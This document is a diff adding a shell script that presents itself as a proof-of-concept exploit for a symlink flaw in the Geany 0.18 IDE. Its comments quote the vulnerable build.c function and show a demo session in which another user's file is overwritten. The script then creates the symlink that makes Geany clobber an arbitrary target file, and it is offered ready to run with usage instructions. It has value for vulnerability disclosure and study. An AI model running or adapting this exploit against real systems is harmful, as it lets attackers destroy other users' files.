@@ -1,0 +1,113 @@
+#!/bin/sh
+# redbull.sh
+# AKA
+# Geany 0.18 Local File Overwrite Exploit
+#
+# Jeremy Brown [0xjbrown41@gmail.com//jbrownsec.blogspot.com//krakowlabs.com] 10.06.2009
+#
+# *********************************************************************************************************
+# I was checking out some IDEs and decided on Geany. Nice interface, good features, but it doesn't defend
+# against symbolic links when writing the run script used for executing files after compiliation.
+#
+# geany-0.18/src/build.c
+#
+# LINES 981-1010
+#
+# static gboolean build_create_shellscript(const gchar *fname, const gchar *cmd, gboolean autoclose)
+# {
+# 	FILE *fp;
+# 	gchar *str;
+# #ifdef G_OS_WIN32
+# 	gchar *expanded_cmd;
+# #endif
+# 
+# 	fp = g_fopen(fname, "w");
+# 	if (! fp)
+# 		return FALSE;
+# #ifdef G_OS_WIN32
+# 	/* Expand environment variables like %blah%. */
+# 	expanded_cmd = win32_expand_environment_variables(cmd);
+# 	str = g_strdup_printf("%s\n\n%s\ndel \"%%0\"\n\npause\n", expanded_cmd, (autoclose) ? "" : "pause");
+# 	g_free(expanded_cmd);
+# #else
+# 	str = g_strdup_printf(
+# 		"#!/bin/sh\n\n%s\n\necho \"\n\n------------------\n(program exited with code: $?)\" \
+# 		\n\n%s\n", cmd, (autoclose) ? "" :
+# 		"\necho \"Press return to continue\"\n#to be more compatible with shells like dash\ndummy_var=\"\"\nread dummy_var");
+# #endif
+#
+# 	fputs(str, fp);
+# 	g_free(str);
+#
+# 	fclose(fp);
+#
+# 	return TRUE;
+# }
+#
+# Not a big deal since the script is generated in the working directory that Geany is executing the compiled
+# program, but, none the less exploitable if the attacker can create a symbolic link in the working directory.
+#
+# linux@ubuntu:~$ ls -al important
+# -rwx------ 1 linux linux 5 2009-10-06 14:10 important
+# linux@ubuntu:~$ cat important
+# *data*
+# linux@ubuntu:~$
+#
+# hacker@linux:~$ sh redbull.sh /tmp /home/linux/important
+#
+# Geany 0.18 Local File Overwrite Exploit
+#
+# [*] Creating symbolic link from /tmp/geany_run_script.sh to /home/linux/important...
+#
+# [*] /home/linux/important should be overwritten when Geany executes a program in /tmp
+#
+# hacker@linux:~$
+#
+# ***** Geany executes a program in /tmp *****
+#
+# linux@ubuntu:~$ cat important
+# #!/bin/sh
+#
+# rm $0
+#
+# "./c"
+#
+# echo "
+#
+# ------------------
+# (program exited with code: $?)" 		
+#
+#
+# echo "Press return to continue"
+# #to be more compatible with shells like dash
+# dummy_var=""
+# read dummy_var
+# linux@ubuntu:~$
+#
+# Due to an Ubuntu's bug reporting system handler's possible lack of zeal (they argued overwriting the
+# instruction pointer in a program when parsing a file format isn't a security issue because the program
+# also interepts shell commands), I'm not very excited to try and work with them too much these days...
+# *********************************************************************************************************
+# redbull.sh
+
+FILE=geany_run_script.sh
+
+if [ "$2" = "" ]; then
+echo
+echo "Geany 0.18 Local File Overwrite Exploit"
+echo
+echo "Usage:   $0 </target/working/dir> <file.to.overwrite>"
+echo "Example: $0 /tmp /home/user/important"
+echo
+exit
+fi
+
+echo
+echo "Geany 0.18 Local File Overwrite Exploit"
+echo
+echo "[*] Creating symbolic link from $1/$FILE to $2..."
+ln -s $2 $1/$FILE
+echo
+echo "[*] $2 should be overwritten when Geany executes a program in $1"
+echo
+exit
